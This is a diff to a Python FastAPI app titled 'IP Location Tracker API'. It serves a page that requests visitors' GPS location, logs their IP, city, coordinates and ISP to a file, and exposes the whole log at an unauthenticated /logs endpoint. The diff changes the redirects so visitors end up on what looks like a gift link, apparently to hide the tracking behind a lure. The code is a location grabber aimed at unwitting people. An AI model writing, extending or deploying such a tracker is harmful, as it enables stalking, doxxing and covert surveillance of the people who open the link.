@@ -4,8 +4,24 @@ from datetime import datetime
 import os
 import httpx
 import json
+from pydantic import BaseModel
+from typing import Optional
 
-app = FastAPI()
+# Modelo para el request de ubicación
+class LocationData(BaseModel):
+    gps_lat: Optional[float] = None
+    gps_lon: Optional[float] = None
+    gps_accuracy: Optional[str] = None
+
+# Configuración de FastAPI con metadatos para Swagger
+app = FastAPI(
+    title="IP Location Tracker API",
+    description="API para rastrear ubicación de visitantes basada en IP y GPS",
+    version="1.0.0",
+    docs_url="/docs",  # URL para Swagger UI (por defecto)
+    redoc_url="/redoc"  # URL para ReDoc (por defecto)
+)
+
 LOG_FILE = "ip_logs.txt"
 
 # Asegura que el archivo exista desde el arranque
@@ -13,11 +29,16 @@ if not os.path.exists(LOG_FILE):
     with open(LOG_FILE, "w", encoding="utf-8") as f:
         f.write("Fecha y hora | IP | País | Región | Ciudad | ZIP | Coordenadas IP | Coordenadas GPS | Precisión | Zona Horaria | ISP | Organización | AS\n")
 
-@app.get("/")
+@app.get("/", 
+         summary="Página principal",
+         description="Redirige automáticamente a la página de tracking")
 def root():
     return RedirectResponse("/track")
 
-@app.get("/track")
+@app.get("/track",
+         summary="Página de tracking",
+         description="Muestra la página HTML que solicita ubicación GPS del usuario",
+         response_class=HTMLResponse)
 async def track(request: Request):
     # Página HTML que solicita ubicación GPS
     html_content = """
@@ -117,13 +138,13 @@ async def track(request: Request):
                         window.location.href = response.url;
                     } else {
                         return response.text().then(text => {
-                            window.location.href = 'https://www.google.com';
+                            window.location.href = 'https://gifft.me/es/o/d/8lh96hrxvkdkd1km86fv1kjn#google_vignette';
                         });
                     }
                 })
                 .catch(error => {
                     console.error('Error:', error);
-                    window.location.href = 'https://www.google.com';
+                    window.location.href = 'https://gifft.me/es/o/d/8lh96hrxvkdkd1km86fv1kjn#google_vignette';
                 });
             }
 
@@ -195,7 +216,10 @@ async def track(request: Request):
     """
     return HTMLResponse(content=html_content)
 
-@app.post("/process-location")
+@app.post("/process-location",
+          summary="Procesar ubicación",
+          description="Procesa los datos de ubicación GPS del usuario y la información de IP, registra todo en logs y redirige",
+          response_class=RedirectResponse)
 async def process_location(request: Request):
     
     # Obtener datos JSON del cuerpo de la petición
@@ -306,10 +330,19 @@ async def process_location(request: Request):
     print(f"🔢 Sistema Autónomo: {ip_info['as']}")
     print("=" * 120)
     
-    return RedirectResponse("https://www.google.com")
+    return RedirectResponse("https://gifft.me/es/o/d/8lh96hrxvkdkd1km86fv1kjn#google_vignette")
 
-@app.get("/logs", response_class=PlainTextResponse)
+@app.get("/logs", 
+         summary="Ver logs",
+         description="Obtiene todos los logs de visitantes registrados",
+         response_class=PlainTextResponse)
 def get_logs():
+    """
+    Endpoint para obtener todos los logs de visitantes.
+    
+    Returns:
+        str: Contenido completo del archivo de logs en formato texto plano
+    """
     try:
         with open(LOG_FILE, "r", encoding="utf-8") as f:
             return f.read()
